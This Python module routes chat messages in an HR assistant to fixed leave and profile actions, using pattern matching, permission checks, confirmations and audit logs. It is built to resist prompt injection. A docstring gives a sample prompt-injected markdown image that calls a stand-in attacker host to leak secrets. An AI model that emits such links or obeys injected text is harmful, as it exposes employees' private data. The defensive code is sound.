"""Chat -> HR actions.

Design rule: the language model never decides to read or write HR data.
This module turns the *user's own typed message* into one of a small set of fixed actions using
plain pattern matching, checks permissions in code (hr_data), and asks the user to confirm before any write.
Text that comes from the policy PDF or from model output can therefore never trigger an action.
Anything not recognised falls through to the policy Q&A (RAG) pipeline.
"""
from __future__ import annotations

import re
import threading
import time
from collections import deque
from dataclasses import dataclass
from datetime import date, timedelta
from typing import Optional

import hr_data as hd
import hr_security as sec
from hr_security import audit

MAX_PROMPT_CHARS = 1000
LLM_HISTORY_MESSAGES = 6
LLM_HISTORY_CHARS = 1500
PENDING_TTL = 300
CHAT_LIMIT = (20, 300)       # messages per window (seconds)
WRITE_LIMIT = (10, 3600)     # confirmed changes per window


# --------------------------------------------------------------------------- rate limiting
class _Limiter:
    def __init__(self):
        self._hits: dict = {}
        self._lock = threading.Lock()

    def allow(self, key: str, limit: int, window: int) -> bool:
        now = time.time()
        with self._lock:
            q = self._hits.setdefault(key, deque())
            while q and q[0] < now - window:
                q.popleft()
            if len(q) >= limit:
                return False
            q.append(now)
            return True

    def reset(self):
        with self._lock:
            self._hits.clear()


chat_limiter = _Limiter()
write_limiter = _Limiter()


def allow_chat(user_id: str) -> bool:
    return chat_limiter.allow(user_id, *CHAT_LIMIT)


# --------------------------------------------------------------------------- output safety
_MD_SPECIAL = re.compile(r"([\\`*_{}\[\]()<>#+!|~$&])")


def md(value) -> str:
    """Escape a database value so it renders as plain text in markdown."""
    return _MD_SPECIAL.sub(r"\\\1", "-" if value is None or value == "" else str(value))


def sanitize_answer(text: str) -> str:
    """Remove everything in model output that could make the browser fetch a URL or render markup.

    Markdown images load automatically, so a prompt-injected '![](http://attacker/?q=secret)' would leak data.
    """
    t = text or ""
    t = re.sub(r"</?[A-Za-z][^>]{0,500}>", "", t)                      # html tags and <autolinks>
    t = re.sub(r"!\[[^\]]*\]\([^)]*\)", "[image removed]", t)           # inline images
    t = re.sub(r"!\[[^\]]*\]\[[^\]]*\]", "[image removed]", t)          # reference images
    t = re.sub(r"\[([^\]]+)\]\([^)]*\)", r"\1", t)                     # inline links -> text
    t = re.sub(r"\[([^\]]+)\]\[[^\]]*\]", r"\1", t)                    # reference links -> text
    t = re.sub(r"(?m)^\s*\[[^\]]+\]:\s*\S+.*$", "", t)                 # reference definitions
    t = re.sub(r"(?i)\b(?:https?|ftp|file|data|javascript):[^\s)>\]]+", "[link removed]", t)
    t = re.sub(r"(?i)\bwww\.[^\s)>\]]+", "[link removed]", t)
    return t.strip()[:6000]


def llm_history(messages: list) -> list:
    """Last few policy-chat turns only (no HR-data replies), each capped in length."""
    keep = [m for m in messages if m.get("kind") != "agent"][-LLM_HISTORY_MESSAGES:]
    return [(m["role"], str(m["content"])[:LLM_HISTORY_CHARS]) for m in keep if m["role"] in ("user", "assistant")]


def neutralize_for_prompt(text: str) -> str:
    """Stop policy text from closing our <policy_excerpts> wrapper or faking other tags."""
    return text.replace("<", "(").replace(">", ")")


# --------------------------------------------------------------------------- dates
_MON = r"(jan(?:uary)?|feb(?:ruary)?|mar(?:ch)?|apr(?:il)?|may|june?|july?|aug(?:ust)?|sep(?:t(?:ember)?)?|oct(?:ober)?|nov(?:ember)?|dec(?:ember)?)"
_MONTH_NUM = {"jan": 1, "feb": 2, "mar": 3, "apr": 4, "may": 5, "jun": 6, "jul": 7, "aug": 8, "sep": 9, "oct": 10, "nov": 11, "dec": 12}
_WEEKDAYS = {"monday": 0, "tuesday": 1, "wednesday": 2, "thursday": 3, "friday": 4, "saturday": 5, "sunday": 6}
_SEP = r"(?:to|until|till|through|thru|-|–|—)"
_ORD = r"(?:st|nd|rd|th)?"
_P_RANGE_DMON = re.compile(rf"\b(\d{{1,2}}){_ORD}\s*{_SEP}\s*(\d{{1,2}}){_ORD}\s+(?:of\s+)?{_MON}\b(?:,?\s+(\d{{4}}))?", re.I)
_P_RANGE_MOND = re.compile(rf"\b{_MON}\.?\s+(\d{{1,2}}){_ORD}\s*{_SEP}\s*(\d{{1,2}}){_ORD}\b(?!\s*[:/]|\d)(?:,?\s+(\d{{4}}))?", re.I)
_P_ISO = re.compile(r"\b(\d{4})-(\d{1,2})-(\d{1,2})\b")
_P_DMY = re.compile(r"\b(\d{1,2})[/.](\d{1,2})[/.](\d{4})\b")  # day first (dd/mm/yyyy)
_P_DMON = re.compile(rf"\b(\d{{1,2}}){_ORD}\s+(?:of\s+)?{_MON}\b(?:,?\s+(\d{{4}}))?", re.I)
_P_MOND = re.compile(rf"\b{_MON}\.?\s+(\d{{1,2}}){_ORD}\b(?!\s*[:/]|\d)(?:,?\s+(\d{{4}}))?", re.I)
_P_REL = re.compile(r"\b(day after tomorrow|tomorrow|today|yesterday|(?:(next|this|coming)\s+)?(monday|tuesday|wednesday|thursday|friday|saturday|sunday))\b", re.I)
_PATTERNS = (("range_dmon", _P_RANGE_DMON), ("range_mond", _P_RANGE_MOND), ("iso", _P_ISO), ("dmy", _P_DMY),
             ("dmon", _P_DMON), ("mond", _P_MOND), ("rel", _P_REL))
_WORD_NUM = {"a": 1, "an": 1, "one": 1, "two": 2, "three": 3, "four": 4, "five": 5, "six": 6, "seven": 7, "eight": 8, "nine": 9, "ten": 10}


def fmt(d: date) -> str:
    return f"{d:%a} {d.day} {d:%b %Y}"


def _mk(day: int, month: int, year: Optional[int], today: date) -> date:
    if year:
        return date(year, month, day)
    cand = date(today.year, month, day)
    if cand < today - timedelta(days=hd.BACKDATE_LIMIT_DAYS):
        cand = date(today.year + 1, month, day)  # a date that has clearly passed means next year
    return cand


def _rel(m, base: date, prev: Optional[date]) -> date:
    word = m.group(1).lower()
    if word == "today":
        return base
    if word == "tomorrow":
        return base + timedelta(days=1)
    if word == "yesterday":
        return base - timedelta(days=1)
    if word == "day after tomorrow":
        return base + timedelta(days=2)
    qual, wd = (m.group(2) or "").lower(), _WEEKDAYS[m.group(3).lower()]
    anchor = prev or base
    delta = (wd - anchor.weekday()) % 7
    if qual in ("next", "coming") and delta == 0:
        delta = 7
    return anchor + timedelta(days=delta)


def extract_dates(text: str, today: date) -> list:
    low = text.lower()
    occupied, found = [], []
    for kind, pat in _PATTERNS:
        for m in pat.finditer(low):
            if all(m.end() <= a or m.start() >= b for a, b in occupied):
                occupied.append(m.span())
                found.append((m.start(), kind, m))
    found.sort(key=lambda x: x[0])
    out = []
    for _, kind, m in found:
        g = m.groups()
        if kind == "range_dmon":
            mon = _MONTH_NUM[g[2][:3]]
            yr = int(g[3]) if g[3] else None
            out += [_mk(int(g[0]), mon, yr, today), _mk(int(g[1]), mon, yr, today)]
        elif kind == "range_mond":
            mon = _MONTH_NUM[g[0][:3]]
            yr = int(g[3]) if g[3] else None
            out += [_mk(int(g[1]), mon, yr, today), _mk(int(g[2]), mon, yr, today)]
        elif kind == "iso":
            out.append(date(int(g[0]), int(g[1]), int(g[2])))
        elif kind == "dmy":
            out.append(date(int(g[2]), int(g[1]), int(g[0])))
        elif kind == "dmon":
            out.append(_mk(int(g[0]), _MONTH_NUM[g[1][:3]], int(g[2]) if g[2] else None, today))
        elif kind == "mond":
            out.append(_mk(int(g[1]), _MONTH_NUM[g[0][:3]], int(g[2]) if g[2] else None, today))
        else:
            out.append(_rel(m, today, out[-1] if out and re.search(_SEP, low[: m.start()][-12:]) else None))
    return out


def parse_period(text: str, today: date):
    """Return ("ok", start, end), ("error", message) or None when the text has no dates."""
    low = text.lower()
    try:
        ds = extract_dates(text, today)
    except ValueError:
        return ("error", "One of those dates doesn't exist. Please check it and try again.")
    with hd.hr_conn() as conn:
        hol = hd._holidays(conn)
    if not ds:
        if re.search(r"\bnext week\b", low):
            mon = today + timedelta(days=7 - today.weekday())
            return ("ok", mon, mon + timedelta(days=4))
        if re.search(r"\b(this week|rest of the week)\b", low):
            return ("ok", today, today + timedelta(days=4 - today.weekday()) if today.weekday() < 5 else today)
        return None
    if len(ds) > 2:
        return ("error", "I found more than two dates. Please give a single date or a start and end date.")
    if len(ds) == 2:
        if ds[1] < ds[0]:
            return ("error", "The end date is before the start date.")
        return ("ok", ds[0], ds[1])
    m = re.search(r"\bfor\s+(\d{1,2}|a|an|one|two|three|four|five|six|seven|eight|nine|ten)\s+(?:(?:working|business)\s+)?(day|days|week|weeks)\b", low)
    if m:
        n = int(m.group(1)) if m.group(1).isdigit() else _WORD_NUM[m.group(1)]
        n = n * 5 if m.group(2).startswith("week") else n
        if 1 <= n <= hd.MAX_LEAVE_CALENDAR_DAYS:
            return ("ok", ds[0], hd.advance_working_days(ds[0], n, hol))
        return ("error", "That's longer than a single request can cover.")
    return ("ok", ds[0], ds[0])


_TYPE_HINTS = (("sick", r"\b(sick|ill|unwell|fever|medical|doctor|hospital|flu)\b"), ("unpaid", r"\b(unpaid|loss of pay|lop)\b"),
               ("casual", r"\bcasual\b"), ("annual", r"\b(annual|vacation|holiday|pto|earned|privilege)\b"))


def leave_type_from(low: str) -> str:
    for t, pat in _TYPE_HINTS:
        if re.search(pat, low):
            return t
    return "annual"


# --------------------------------------------------------------------------- people lookup
def find_people(low: str, people: list) -> list:
    ids = {m.upper() for m in re.findall(r"\be\d{3,6}\b", low)}
    hits = [p for p in people if p["employee_id"].upper() in ids]
    if hits:
        return hits
    hits = [p for p in people if re.search(rf"\b{re.escape(p['name'].lower())}\b", low)]
    if hits:
        return hits
    words = set(re.findall(r"[a-z]+", low))
    return [p for p in people if len(p["name"].split()[0]) >= 3 and p["name"].split()[0].lower() in words]


# --------------------------------------------------------------------------- reply type
@dataclass
class Reply:
    text: str
    pending: Optional[dict] = None
    handled: bool = True


def _pending(actor_id: str, kind: str, params: dict) -> dict:
    return {"kind": kind, "actor": actor_id, "params": params, "expires": time.time() + PENDING_TTL}


_YES = {"yes", "y", "yep", "yeah", "confirm", "confirmed", "ok", "okay", "sure", "proceed", "go ahead", "do it", "please do"}
_NO = {"no", "n", "nope", "cancel", "stop", "abort", "never mind", "nevermind", "don't", "dont"}

# --------------------------------------------------------------------------- patterns
_QUESTIONISH = re.compile(r"^(how|what|when|where|why|which|who|can|could|do|does|is|are|should|am|will)\b|\b(policy|policies|rules?|eligib\w*|entitle\w*|how many)\b")
_APPLY = re.compile(r"\b(apply|applying|request|requesting|book|booking|take|taking|need|want|file|submit|schedule|plan|going)\b.{0,40}\b(leave|leaves|vacation|time off|day off|days off|pto|off)\b"
                    r"|\bi(?:'ll| will|'m| am)\s+(?:be\s+)?(?:off|out|away|on leave|on vacation|taking)\b")
_BALANCE = re.compile(r"\b(leave|leaves|vacation|pto|time off|days off)\b.{0,25}\b(balance|left|remaining|available)\b"
                      r"|\b(balance|remaining)\b.{0,15}\b(leave|leaves|vacation|pto)\b"
                      r"|\bhow many\b.{0,30}\b(leaves?|days|vacation|pto)\b.{0,20}\b(left|remaining|do i have|have i got|available)\b")
_MY_REQUESTS = re.compile(r"\bmy\b.{0,20}\b(leave|time off)\b.{0,12}\b(requests?|applications?|status)\b|\bstatus of my\b.{0,15}\b(leave|request)\b|\b(show|list|view)\b.{0,10}\bmy (?:leave )?requests?\b")
_PENDING_LIST = re.compile(r"\b(pending|awaiting|open|outstanding)\b.{0,20}\b(requests?|approvals?)\b|\b(requests?|leaves?)\b.{0,25}\b(to approve|awaiting my|need(?:s)? (?:my )?approval)\b")
_APPROVE = re.compile(r"^(?:please\s+)?(approve|reject|deny|decline)\s+(?:leave\s+)?(?:request\s+)?#?(\d{1,9})\b(.*)$", re.I)
_CANCEL = re.compile(r"^(?:please\s+)?cancel\s+(?:my\s+)?(?:leave\s+)?(?:request\s+)?#?(\d{1,9})\b", re.I)
_WHO_ON_LEAVE = re.compile(r"\bwho(?:'s|\s+is|\s+are)?\b.{0,25}\b(on leave|on vacation|on holiday|out of office|out|away|off|absent)\b")
_TEAM = re.compile(r"\b(my team|my direct reports?|who reports? to me|my reportees?)\b")
_STATUS = re.compile(r"\b(on leave|on vacation|on holiday|out of office|ooo|out today|away|time off|leave|vacation|back|returns?|returning|come back|coming back)\b")
_PROFILE_KW = re.compile(r"\b(details?|info|information|profile|contact|e-?mail|phone|mobile|number|department|dept|title|designation|role|manager|reports to|address|location|office|joined|hire date|salary|band|who is|who's|tell me about)\b")
_SELF_PROFILE = re.compile(r"\bmy\s+(details|info|information|profile|phone|mobile|email|e-mail|address|department|job title|title|designation|location|salary band|salary|manager|boss|supervisor|hire date|emergency contact)\b")
_MY_MANAGER = re.compile(r"\bmy\s+(manager|boss|supervisor|line manager)\b")
_HELP = re.compile(r"\b(what can you do|what do you do|help me with|your capabilities|what can i ask)\b")
_FIELD_WORDS = {
    "email": "email", "e-mail": "email", "phone": "phone", "mobile": "phone", "number": "phone", "department": "department",
    "dept": "department", "title": "job_title", "designation": "job_title", "role": "job_title", "location": "location",
    "office": "location", "address": "address", "salary": "salary_band", "band": "salary_band", "manager": "manager_id",
    "boss": "manager_id", "supervisor": "manager_id", "joined": "hire_date", "hire": "hire_date", "emergency": "emergency_contact_name",
}

_FIELD_ALT = (r"phone(?:\s+number)?|mobile(?:\s+number)?|address|home\s+address|department|job\s*title|title|location|work\s*email|email|"
              r"reporting\s+manager|manager|status|salary\s*band|emergency\s+contact(?:\s+(?:name|phone|number))?")
_SELF_UPDATE = re.compile(rf"^(?:please\s+)?(?:update|change|set|edit|modify)\s+my\s+(?P<field>{_FIELD_ALT})\s*(?:to|as|is|=|:)\s*(?P<value>.+)$", re.I)
_HR_UPDATE_1 = re.compile(rf"^(?:please\s+)?(?:update|change|set|edit|modify)\s+(?:the\s+)?(?P<field>{_FIELD_ALT})\s+(?:of|for)\s+(?P<who>.+?)\s+(?:to|as|=)\s+(?P<value>.+)$", re.I)
_HR_UPDATE_2 = re.compile(rf"^(?:please\s+)?(?:update|change|set|edit|modify)\s+(?P<who>.+?)['’]s\s+(?P<field>{_FIELD_ALT})\s+(?:to|as|=)\s+(?P<value>.+)$", re.I)
_HR_MOVE = re.compile(r"^(?:please\s+)?move\s+(?P<who>.+?)\s+to\s+(?P<value>.+?)\s+(?:department|team)$", re.I)
_HR_REPORT = re.compile(r"^(?:please\s+)?make\s+(?P<who>.+?)\s+report\s+to\s+(?P<value>.+)$", re.I)
_HR_STATUS = re.compile(r"^(?:please\s+)?(?:mark|set)\s+(?P<who>.+?)\s+as\s+(?P<value>terminated|active|inactive)$", re.I)
_PHONE_TAIL = re.compile(r"(\+?\d[\d ()\-.]{5,19}\d)\s*\)?\s*$")


def _field_key(raw: str) -> str:
    r = " ".join(raw.lower().split())
    if r.startswith("emergency"):
        return "emergency_contact_phone" if ("phone" in r or "number" in r) else ("emergency_contact_name" if "name" in r else "emergency_contact")
    if "email" in r:
        return "email"
    if "phone" in r or "mobile" in r:
        return "phone"
    if "address" in r:
        return "address"
    if "title" in r:
        return "job_title"
    if "manager" in r:
        return "manager_id"
    if "band" in r:
        return "salary_band"
    return r


# --------------------------------------------------------------------------- formatting
def _profile_text(actor: dict, target_id: str, wanted: list) -> str:
    ok, res = hd.get_profile(actor["employee_id"], target_id)
    if not ok:
        return res
    fields = res["fields"]
    name = md(fields.get("name"))
    if wanted:
        shown = [f for f in wanted if f in fields]
        hidden = [f for f in wanted if f not in fields and not (f == "emergency_contact_name" and "emergency_contact_name" in fields)]
        if not shown and hidden:
            return f"You don't have access to {md(hd.FIELD_LABELS[hidden[0]].lower())} for **{name}**."
    else:
        shown = [f for f in hd.ALL_FIELDS if f in fields and f not in ("employee_id", "name")]
    lines = [f"**{name}** ({md(fields.get('employee_id'))})"]
    for f in shown:
        if f in ("employee_id", "name"):
            continue
        lines.append(f"- **{hd.FIELD_LABELS[f]}:** {md(fields.get(f))}")
        if f == "emergency_contact_name" and "emergency_contact_phone" in fields and "emergency_contact_phone" not in shown:
            lines[-1] += f" ({md(fields.get('emergency_contact_phone'))})"
    if res["restricted"] and not wanted:
        lines.append("\n*Some details are only visible to the employee, their manager and HR.*")
    return "\n".join(lines)


def _leave_status_text(actor: dict, person: dict) -> str:
    t = hd.today()
    name = md(person["name"])
    if not person["active"]:
        return f"**{name}** is no longer an active employee."
    if person["employee_id"] != actor["employee_id"]:
        audit(actor["employee_id"], "leave_lookup", target=person["employee_id"])
    detail = hd.can_see_leave_detail(actor, person)
    b = hd.current_leave(person["employee_id"], t)
    if b:
        kind = f" ({md(', '.join(sorted(b['types'])))} leave)" if detail else ""
        return (f"**{name}** is on leave{kind} from {fmt(b['start'])} to {fmt(b['end'])} "
                f"and is expected back on **{fmt(b['return_date'])}**.")
    nxt = hd.next_leave(person["employee_id"], t)
    s = f"**{name}** isn't on leave today."
    if nxt and (nxt["start"] - t).days <= 120:
        s += f" Their next approved leave is {fmt(nxt['start'])} to {fmt(nxt['end'])}, and they'll be back on {fmt(nxt['return_date'])}."
    else:
        s += " No upcoming approved leave is on record."
    return s


def _who_on_leave_text(start: date, end: date) -> str:
    rows = hd.who_on_leave(start, end)
    label = fmt(start) if start == end else f"{fmt(start)} to {fmt(end)}"
    if not rows:
        return f"Nobody is on approved leave for {label}."
    lines = [f"People on approved leave for {label}:"]
    for r in rows[:25]:
        lines.append(f"- **{md(r['name'])}** ({md(r['department'])}): {fmt(r['start'])} to {fmt(r['end'])}, back {fmt(r['return_date'])}")
    if len(rows) > 25:
        lines.append(f"- ...and {len(rows) - 25} more")
    return "\n".join(lines)


def _balance_text(actor_id: str) -> str:
    bal = hd.leave_balance(actor_id)
    y = hd.today().year
    lines = [f"Your leave balance for {y}:"]
    for t, v in bal.items():
        extra = f" ({v['pending']:g} pending approval)" if v["pending"] else ""
        lines.append(f"- **{t.capitalize()}:** {v['available']:g} of {v['allotted']:g} days available{extra}")
    return "\n".join(lines)


def _requests_text(actor_id: str) -> str:
    rows = hd.my_requests(actor_id)
    if not rows:
        return "You haven't made any leave requests yet."
    lines = ["Your recent leave requests:"]
    for r in rows:
        lines.append(f"- **#{r['id']}** {md(r['leave_type'])}, {fmt(r['start'])} to {fmt(r['end'])} ({r['days']:g} d): **{md(r['status'])}**")
    return "\n".join(lines)


def _pending_list_text(actor_id: str) -> str:
    rows = hd.pending_for_approval(actor_id)
    if not rows:
        return "There are no leave requests waiting for your approval."
    lines = ["Leave requests waiting for you (say \"approve leave 12\" or \"reject leave 12\"):"]
    for r in rows:
        lines.append(f"- **#{r['id']}** {md(r['name'])}: {md(r['leave_type'])}, {fmt(r['start'])} to {fmt(r['end'])} ({r['days']:g} d)")
    return "\n".join(lines)


_HELP_TEXT = (
    "I can answer questions from the company policy, and I can also help with HR records:\n"
    "- **Who's away:** \"Is Bob on leave?\", \"When will Carol be back?\", \"Who is on leave next week?\"\n"
    "- **Your leave:** \"Apply for leave from 14 Oct to 16 Oct\", \"My leave balance\", \"Cancel leave 12\"\n"
    "- **Your details:** \"Show my details\", \"Update my phone to +1-555-0100\"\n"
    "- **Managers and HR:** \"Pending leave requests\", \"Approve leave 12\"; HR can also update employee records.\n"
    "I always ask you to confirm before changing anything."
)


# --------------------------------------------------------------------------- routing
def _resolve_one(text: str, people: list):
    """Return (person, None) or (None, message)."""
    hits = find_people(text.lower(), people)
    uniq = {p["employee_id"]: p for p in hits}
    if len(uniq) == 1:
        return next(iter(uniq.values())), None
    if not uniq:
        return None, "I couldn't find that employee. Try their full name or Employee ID."
    opts = ", ".join(f"{md(p['name'])} ({md(p['employee_id'])})" for p in list(uniq.values())[:6])
    return None, f"That could be more than one person: {opts}. Which one do you mean? Please use the Employee ID."


def route(actor: dict, text: str) -> Reply:
    t = " ".join(text.split())
    low = t.lower().rstrip("?.! ")
    is_hr = actor["role"] == "hr_admin"
    aid = actor["employee_id"]
    today = hd.today()

    if _HELP.search(low):
        return Reply(_HELP_TEXT)

    # ---- decisions on leave requests
    m = _APPROVE.match(t)
    if m:
        approve = m.group(1).lower() == "approve"
        note = re.sub(r"^\s*(?:because|reason|:|-)\s*", "", m.group(3).strip(), flags=re.I) or None
        rid = int(m.group(2))
        verb = "approve" if approve else "reject"
        return Reply(f"I'll **{verb}** leave request **#{rid}**{' with the note: ' + md(note) if note else ''}. Confirm?",
                     _pending(aid, "leave_decide", {"id": rid, "approve": approve, "note": note}))
    m = _CANCEL.match(t)
    if m:
        rid = int(m.group(1))
        return Reply(f"I'll **cancel** leave request **#{rid}**. Confirm?", _pending(aid, "leave_cancel", {"id": rid}))
    if _PENDING_LIST.search(low):
        if actor["role"] == "employee" or re.search(r"\bmy\b", low):
            return Reply(_requests_text(aid))
        return Reply(_pending_list_text(aid))
    if _MY_REQUESTS.search(low):
        return Reply(_requests_text(aid))

    # ---- apply for leave
    if _APPLY.search(low):
        per = parse_period(t, today)
        policyish = re.search(r"\b(policy|policies|rules?|eligib\w*|entitle\w*|how many|process|procedure)\b", low)
        if per is None and (_QUESTIONISH.search(low) or policyish):
            pass  # looks like a policy question: let the policy assistant answer
        elif per is None:
            return Reply("Sure. Which dates? For example: \"apply for leave from 14 Oct to 16 Oct\" or \"sick leave tomorrow\".")
        elif per[0] == "error":
            return Reply(per[1])
        elif not policyish:
            _, s, e = per
            ltype = leave_type_from(low)
            rm = re.search(r"(?:reason|because|due to)\s*[:\-]?\s*(.+)$", t, re.I)
            reason = rm.group(1).strip()[:200] if rm else None
            with hd.hr_conn() as conn:
                hol = hd._holidays(conn)
            days = hd.count_working_days(s, e, hol)
            rng = fmt(s) if s == e else f"{fmt(s)} to {fmt(e)}"
            return Reply(f"I'll request **{ltype} leave** for **{rng}** ({days} working day{'s' if days != 1 else ''})"
                         f"{' with reason: ' + md(reason) if reason else ''}. It will go to your manager or HR for approval. Confirm?",
                         _pending(aid, "leave_apply", {"type": ltype, "start": s.isoformat(), "end": e.isoformat(), "reason": reason}))

    # ---- self-service profile updates
    m = _SELF_UPDATE.match(t)
    if m:
        key, value = _field_key(m.group("field")), m.group("value").strip()
        if key == "emergency_contact":
            pm = _PHONE_TAIL.search(value)
            name_part = value[: pm.start()] if pm else ""
            name_part = re.sub(r"[\s,;:()\-]+$", "", name_part).strip()
            if not pm or not name_part:
                return Reply("Please give both a name and a phone number, e.g. \"update my emergency contact to Jane Doe, +1-555-0123\".")
            changes = {"emergency_contact_name": name_part, "emergency_contact_phone": pm.group(1)}
        else:
            changes = {key: value}
        if any(k not in hd.SELF_EDITABLE for k in changes):
            audit(aid, "profile_update", target=aid, outcome="denied", detail="chat: field not self-editable")
            return Reply("You can update your phone, address and emergency contact yourself. Other details are managed by HR.")
        for k, v in changes.items():
            _, err = hd.validate_field(k, v)
            if err:
                return Reply(err)
        shown = ", ".join(f"{hd.FIELD_LABELS[k].lower()} to **{md(v)}**" for k, v in changes.items())
        return Reply(f"I'll change your {shown}. Confirm?", _pending(aid, "profile_update", {"target": aid, "changes": changes}))

    # ---- HR updates to someone else
    for pat, fixed in ((_HR_UPDATE_1, None), (_HR_UPDATE_2, None), (_HR_MOVE, "department"), (_HR_REPORT, "manager_id"), (_HR_STATUS, "status")):
        m = pat.match(t)
        if not m:
            continue
        people = hd.list_people(include_inactive=is_hr)
        who_text = m.group("who")
        if re.fullmatch(r"(?i)(me|myself|my)", who_text.strip()):
            return Reply("To change your own details, say e.g. \"update my phone to ...\".")
        person, err = _resolve_one(who_text, people)
        if err:
            return Reply(err)
        key = fixed or _field_key(m.group("field"))
        value = m.group("value").strip()
        if key == "emergency_contact":
            return Reply("Please update the emergency contact name and phone as two separate changes.")
        if key not in hd.HR_EDITABLE:
            return Reply("That field can't be changed from chat.")
        if not is_hr and person["employee_id"] != aid:
            audit(aid, "profile_update", target=person["employee_id"], outcome="denied", detail="chat: not hr_admin")
            return Reply("Only HR admins can change other employees' records.")
        if key == "manager_id":
            mgr, merr = _resolve_one(value, hd.list_people())
            if merr:
                return Reply(merr)
            value = mgr["employee_id"]
        _, verr = hd.validate_field(key, value)
        if verr:
            return Reply(verr)
        label = hd.FIELD_LABELS[key].lower()
        shown = md(value) if key not in ("manager_id",) else md(f"{mgr['name']} ({mgr['employee_id']})")
        cur = hd.get_person(person["employee_id"]) or {}
        old = cur.get("status") if key == "status" else cur.get(key)
        if key == "manager_id" and old:
            om = hd.get_person(old)
            old = f"{om['name']} ({om['employee_id']})" if om else old
        extra = f" (currently {md(old)})" if old and key not in ("address", "phone", "emergency_contact_phone", "salary_band", "email") else ""
        warn = " **This will also block their sign-in.**" if key == "status" and value.lower() in ("terminated", "inactive") else ""
        return Reply(f"I'll set **{md(person['name'])}**'s {label} to **{shown}**{extra}.{warn} Confirm?",
                     _pending(aid, "profile_update", {"target": person["employee_id"], "changes": {key: value}}))

    if re.match(r"(?i)^(please\s+)?(update|change|set|edit|modify)\s+my\s+(department|job\s*title|title|salary|manager|status|email|work\s*email)\b", t):
        audit(aid, "profile_update", target=aid, outcome="denied", detail="chat: field not self-editable")
        return Reply("Those details can only be changed by HR. You can update your phone, address and emergency contact yourself.")

    # ---- reads
    if _BALANCE.search(low) and re.search(r"\b(my|i)\b", low):
        return Reply(_balance_text(aid))

    if _TEAM.search(low):
        reps = hd.direct_reports(aid)
        if not reps:
            return Reply("You don't have any direct reports on record.")
        lines = ["Your team today:"]
        for r in reps:
            b = hd.current_leave(r["employee_id"], today)
            status = f"on leave until {fmt(b['end'])}, back {fmt(b['return_date'])}" if b else "available"
            lines.append(f"- **{md(r['name'])}** ({md(r['job_title'])}): {status}")
        return Reply("\n".join(lines))

    if _WHO_ON_LEAVE.search(low) and not find_people(low, hd.list_people()):
        per = parse_period(t, today)
        if per and per[0] == "error":
            return Reply(per[1])
        s, e = (per[1], per[2]) if per else (today, today)
        return Reply(_who_on_leave_text(s, e))

    people = hd.list_people(include_inactive=is_hr)
    mm = _MY_MANAGER.search(low)
    if mm and _STATUS.search(low) and actor.get("manager_id"):
        p = next((x for x in people if x["employee_id"] == actor["manager_id"]), None)
        if p:
            return Reply(_leave_status_text(actor, hd.get_person(p["employee_id"])))
    if mm and not _STATUS.search(low):
        if not actor.get("manager_id"):
            return Reply("You don't have a manager on record.")
        return Reply("Your manager:\n" + _profile_text(actor, actor["manager_id"], []))

    sm = _SELF_PROFILE.search(low)
    if sm and not find_people(low, people):
        wanted = [f for k, f in _FIELD_WORDS.items() if re.search(rf"\b{re.escape(k)}\b", sm.group(1))]
        return Reply(_profile_text(actor, aid, wanted[:1]))

    found = find_people(low, people)
    if found:
        uniq = {p["employee_id"]: p for p in found}
        if _STATUS.search(low):
            person, err = _resolve_one(low, people)
            if err:
                return Reply(err)
            return Reply(_leave_status_text(actor, hd.get_person(person["employee_id"])))
        if _PROFILE_KW.search(low):
            person, err = _resolve_one(low, people)
            if err:
                return Reply(err)
            wanted = []
            for k, f in _FIELD_WORDS.items():
                if re.search(rf"\b{re.escape(k)}\b", low) and f not in wanted:
                    wanted.append(f)
            return Reply(_profile_text(actor, person["employee_id"], wanted[:1] if len(wanted) == 1 else []))
    return Reply("", handled=False)


def handle(actor_id: str, text: str, pending: Optional[dict] = None) -> Reply:
    """Entry point used by the UI for every typed message."""
    actor = sec.get_user(actor_id)
    if not actor or not actor["active"]:
        return Reply("Your session is no longer valid. Please sign in again.")
    low = " ".join(text.lower().split()).rstrip("!. ")
    if pending and pending.get("actor") == actor_id and time.time() <= pending.get("expires", 0):
        if low in _YES:
            return Reply(execute_pending(actor_id, pending))
        if low in _NO:
            return Reply("Okay, I've cancelled that.")
    try:
        r = route(actor, text)
    except Exception:  # never show internals
        import logging
        logging.getLogger("hr.agent").exception("agent failure")
        return Reply("Sorry, I couldn't process that request. Please try rephrasing it.")
    r.text = sanitize_answer(r.text) if r.text else r.text
    return r


def execute_pending(actor_id: str, pending: Optional[dict]) -> str:
    """Run a confirmed action. Everything is re-checked against the database at this moment."""
    if not pending or pending.get("actor") != actor_id:
        return "That request is no longer valid."
    if time.time() > pending.get("expires", 0):
        return "That request expired. Please ask again."
    if not write_limiter.allow(actor_id, *WRITE_LIMIT):
        audit(actor_id, "rate_limited", detail="writes")
        return "You've made a lot of changes recently. Please wait a while before making more."
    kind, p = pending["kind"], pending["params"]
    try:
        if kind == "leave_apply":
            ok, msg, _ = hd.request_leave(actor_id, p["type"], date.fromisoformat(p["start"]), date.fromisoformat(p["end"]), p.get("reason"))
        elif kind == "leave_decide":
            ok, msg = hd.decide_leave(actor_id, int(p["id"]), bool(p["approve"]), p.get("note"))
        elif kind == "leave_cancel":
            ok, msg = hd.cancel_leave(actor_id, int(p["id"]))
        elif kind == "profile_update":
            ok, msg = hd.update_profile(actor_id, p["target"], p["changes"], via="chat")
        else:
            return "That request is no longer valid."
    except Exception:
        import logging
        logging.getLogger("hr.agent").exception("pending action failed")
        return "Sorry, that change couldn't be completed. Nothing was changed."
    return sanitize_answer(("Done. " if ok else "I couldn't do that. ") + msg)
